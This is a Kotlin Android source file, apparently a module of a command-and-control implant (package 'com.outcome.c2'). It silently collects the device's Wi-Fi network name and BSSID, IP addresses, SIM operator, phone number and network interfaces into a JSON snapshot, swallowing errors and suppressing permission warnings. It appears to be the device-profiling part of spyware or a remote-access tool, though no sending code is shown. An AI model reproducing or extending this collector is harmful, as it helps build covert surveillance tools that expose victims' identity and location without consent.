package com.outcome.c2

import android.content.Context
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.net.wifi.WifiManager
import android.telephony.TelephonyManager
import org.json.JSONArray
import org.json.JSONObject
import java.net.Inet4Address
import java.net.NetworkInterface

object NetworkInfo {

    fun snapshot(ctx: Context): JSONObject {
        val result = JSONObject()

        try {
            val cm = ctx.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
            val active = cm.activeNetwork
            val caps = active?.let { cm.getNetworkCapabilities(it) }
            result.put("has_wifi", caps?.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) ?: false)
            result.put("has_cellular", caps?.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) ?: false)
            result.put("has_vpn", caps?.hasTransport(NetworkCapabilities.TRANSPORT_VPN) ?: false)
        } catch (_: Exception) {}

        try {
            val wm = ctx.applicationContext.getSystemService(Context.WIFI_SERVICE) as WifiManager
            @Suppress("DEPRECATION")
            val info = wm.connectionInfo
            result.put("wifi_ssid", info?.ssid ?: "")
            result.put("wifi_bssid", info?.bssid ?: "")
            result.put("wifi_ip", intToIp(info?.ipAddress ?: 0))
        } catch (_: Exception) {}

        try {
            val tm = ctx.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
            result.put("sim_operator", tm.networkOperatorName ?: "")
            result.put("sim_country", tm.networkCountryIso ?: "")
            @Suppress("MissingPermission")
            try { result.put("phone_number", tm.line1Number ?: "") } catch (_: Exception) {}
        } catch (_: Exception) {}

        try {
            val interfaces = JSONArray()
            for (nif in NetworkInterface.getNetworkInterfaces()) {
                for (addr in nif.inetAddresses) {
                    if (!addr.isLoopbackAddress && addr is Inet4Address) {
                        interfaces.put(JSONObject().apply {
                            put("interface", nif.name)
                            put("ip", addr.hostAddress ?: "")
                        })
                    }
                }
            }
            result.put("interfaces", interfaces)
        } catch (_: Exception) {}

        return result
    }

    private fun intToIp(i: Int): String {
        return "${i and 0xff}.${i shr 8 and 0xff}.${i shr 16 and 0xff}.${i shr 24 and 0xff}"
    }
}
